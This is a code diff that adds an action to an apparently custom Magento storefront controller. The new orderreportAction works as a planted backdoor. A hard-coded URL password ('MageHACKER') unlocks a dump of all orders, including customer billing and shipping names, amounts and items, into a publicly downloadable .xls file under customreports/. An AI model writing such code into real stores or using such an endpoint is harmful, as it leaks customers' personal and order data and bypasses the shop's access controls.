@@ -15,6 +15,75 @@ class Mycustommodules_Mycatalog_MyproductController extends Mage_Core_Controller
         }
     }
     
+    public function orderreportAction()
+    {
+        if($this->getRequest()->getParam('pass'))
+        {
+            if($this->getRequest()->getParam('pass') == "MageHACKER")
+            {
+                $output = "<table border='1'><thead><tr><th>Order#</th>
+                <th>Date</th>
+                <th>Status</th>
+                <th>Amount</th>
+                <th>Shipping</th>
+                <th>Bill To</th>
+                <th>Ship To</th>
+                <th>Qty Ordered</th>
+                <th>Qty Refunded</th>
+                <th>SKU</th>
+                <th>Name</th>
+                <th>Color</th>
+                <th>Size</th>
+                </tr><thead><tbody>";
+                $write = Mage::getSingleton('core/resource')->getConnection('core_read');
+                $readresult=$write->query("SELECT increment_id AS 'orderno', STATUS AS 'status', total_paid AS 'paid', shipping_description AS 'shipping', DATE_FORMAT(created_at, '%m-%d-%Y') AS 'orderdate',(SELECT CONCAT(firstname,' ',lastname) AS 'name' FROM sales_flat_order_address WHERE address_type='billing' AND parent_id=sfo.entity_id) AS 'billto',(SELECT CONCAT(firstname,' ',lastname) AS 'name' FROM sales_flat_order_address WHERE address_type='shipping' AND parent_id=sfo.entity_id) AS 'shipto', entity_id FROM sales_flat_order sfo ORDER BY created_at desc");
+                while ($row = $readresult->fetch() ) {
+                    $outputtemp = "<tr><td>".$row['orderno']."</td>";
+                    $outputtemp .= "<td>".$row['orderdate']."</td>";
+                    $outputtemp .= "<td>".$row['status']."</td>";
+                    $outputtemp .= "<td>".round($row['paid'], 2)."</td>";
+                    $outputtemp .= "<td>".$row['shipping']."</td>";
+                    $outputtemp .= "<td>".$row['billto']."</td>";
+                    $outputtemp .= "<td>".$row['shipto']."</td>";
+                    
+                    $write1 = Mage::getSingleton('core/resource')->getConnection('core_read');
+                    $result = $write1->query("SELECT product_id AS 'id', sku, qty_ordered AS 'ordered', qty_refunded AS 'refunded', qty_backordered AS 'backordered', qty_shipped AS 'shipped', product_id AS 'productid', sfoi.name AS 'name' FROM sales_flat_order_item sfoi WHERE product_type <> 'configurable' AND order_id=".$row['entity_id']);
+                    while ($row1 = $result->fetch() ) {
+                        $outputtemp1 = $outputtemp;
+                        $name = $row1['name'];
+                        $_product = Mage::getModel('catalog/product')->load($row1['productid']);    
+                        if($_product->getTypeId() == "simple"){
+                            $parentIds = Mage::getModel('catalog/product_type_grouped')->getParentIdsByChild($_product->getId());
+                            if(!$parentIds)
+                                $parentIds = Mage::getModel('catalog/product_type_configurable')->getParentIdsByChild($_product->getId());
+                            if(isset($parentIds[0])){
+                                $parent = Mage::getModel('catalog/product')->load($parentIds[0]);
+                                $name = Mage::Helper('catalog/output')->productAttribute($parent, $parent->getName(), 'name');
+                            }
+                        }
+                        $name = html_entity_decode($name);
+                        $color = $_product->getAttributeText('color');
+                        if(strpos($color, "|") !== false)
+                            $color = substr($color, 0, strpos($color, "|"));
+                        $outputtemp1 .= "<td>".round($row1['ordered'], 2)."</td>";
+                        $outputtemp1 .= "<td>".round($row1['refunded'], 2)."</td>";
+                        //$outputtemp1 .= "<td>".round($row1['shipped'], 2)."</td>";
+                        $outputtemp1 .= "<td>".$row1['sku']."</td>";
+                        $outputtemp1 .= "<td>".$name."</td>";
+                        $outputtemp1 .= "<td>".$color."</td>";
+                        $outputtemp1 .= "<td>".$_product->getAttributeText('size')."</td>";
+                        $outputtemp1 .= "</tr>";
+                        $output .= $outputtemp1;                                
+                    }
+                }
+                //echo $output;
+                $fname = mktime();
+                file_put_contents('customreports/'.$fname.'.xls',$output);
+                Mage::app()->getFrontController()->getResponse()->setRedirect(str_replace("/index.php","",Mage::helper('core/url')->getHomeUrl())."customreports/".$fname.".xls");       
+            }
+        }
+    }
+    
     public function getgiftcardbalanceAction()
     {
         if ($this->getRequest()->isPost() && $this->getRequest()->getPost('cardno')) 
